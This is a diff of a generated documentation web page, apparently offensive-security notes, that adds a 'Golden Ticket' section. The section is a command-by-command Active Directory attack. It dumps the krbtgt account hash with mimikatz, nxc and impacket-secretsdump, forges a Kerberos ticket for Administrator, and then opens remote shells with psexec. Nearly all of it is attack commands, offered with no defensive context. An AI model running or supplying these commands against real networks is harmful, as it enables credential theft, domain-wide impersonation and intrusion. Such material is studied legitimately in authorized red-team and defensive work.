@@ -99,6 +99,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#get-domain-sid" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -2240,6 +2245,19 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Golden Ticket
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -2251,6 +2269,50 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#get-domain-sid" class="md-nav__link">
+    <span class="md-ellipsis">
+      Get domain SID
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#get-krbtgt-account-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Get krbtgt account hash
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#generate-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Generate ticket
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -3665,6 +3727,41 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#get-domain-sid" class="md-nav__link">
+    <span class="md-ellipsis">
+      Get domain SID
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#get-krbtgt-account-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Get krbtgt account hash
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#generate-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Generate ticket
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -3684,7 +3781,48 @@
 
   <h1>Golden Ticket</h1>
 
-
+<p>forge a Kerberos Ticket Granting Ticket (TGT) with using a domain's KRBTGT account hash, allowing an attacker to impersonate any user including domain admins without needing their credentials.</p>
+<h4 id="get-domain-sid"><strong>Get domain SID</strong></h4>
+<p>locally:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">(</span><span class="nb">Get-ADDomain</span><span class="p">).</span><span class="n">DomainSID</span>
+</span></code></pre></div>
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>whoami /user # (domain SID is the part before the last hyphen (RID).)
+</span></code></pre></div>
+remotely:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nxc ldap &lt;target&gt; -u &lt;user&gt; -p &lt;pass&gt; --sid
+</span></code></pre></div></p>
+<h4 id="get-krbtgt-account-hash"><strong>Get krbtgt account hash</strong></h4>
+<p>locally - mimikatz
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>lsadump::lsa<span class="w"> </span>/inject<span class="w"> </span>/name:krbtgt
+</span></code></pre></div>
+remotely - nxc
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&gt;ip&gt;<span class="w"> </span>--local-auth<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--lsa<span class="w"> </span>--user<span class="w"> </span>krbtgt
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;dcip&gt;<span class="w"> </span>--local-auth<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--ntds<span class="w"> </span>--user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+remotely - secretsdump
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>impacket-secretsdump<span class="w"> </span>user:pass@10.0.0.35
+</span></code></pre></div></p>
+<h4 id="generate-ticket"><strong>Generate ticket</strong></h4>
+<p><strong>with mimikatz</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>kerberos::golden /User:Administrator /domain:domain.local /sid:&lt;SID&gt; /krbtgt:&lt;krbtgt hash&gt; /id:500 /ptt
+</span></code></pre></div>
+spawn shell with ticket
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">misc</span><span class="p">::</span><span class="n">cmd</span>
+</span></code></pre></div>
+Now we can use psexec for a shell anywhere
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">psexec</span><span class="p">.</span><span class="n">exe</span>  <span class="n">-accepteula</span> <span class="p">\\</span><span class="n">hostname</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div>
+<strong>With impacket</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>impacket-ticketer<span class="w"> </span>-nthash<span class="w"> </span>&lt;krbtgt_ntlm_hash&gt;<span class="w"> </span>-domain-sid<span class="w"> </span>&lt;domain_sid&gt;<span class="w"> </span>-domain<span class="w"> </span>&lt;domain_name&gt;<span class="w">  </span>&lt;user_name&gt;
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="c1"># OR with aes</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>python<span class="w"> </span>ticketer.py<span class="w"> </span>-aesKey<span class="w"> </span>&lt;aes_key&gt;<span class="w"> </span>-domain-sid<span class="w"> </span>&lt;domain_sid&gt;<span class="w"> </span>-domain<span class="w"> </span>&lt;domain_name&gt;<span class="w">  </span>&lt;user_name&gt;
+</span></code></pre></div>
+set ticket env var
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>export KRB5CCNAME=&lt;TGS_ccache_file&gt;
+</span></code></pre></div>
+Then you can access anything
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>impacket-psexec<span class="w"> </span>&lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt;<span class="w"> </span>-k<span class="w"> </span>-no-pass
+</span></code></pre></div></p>
 
 
 
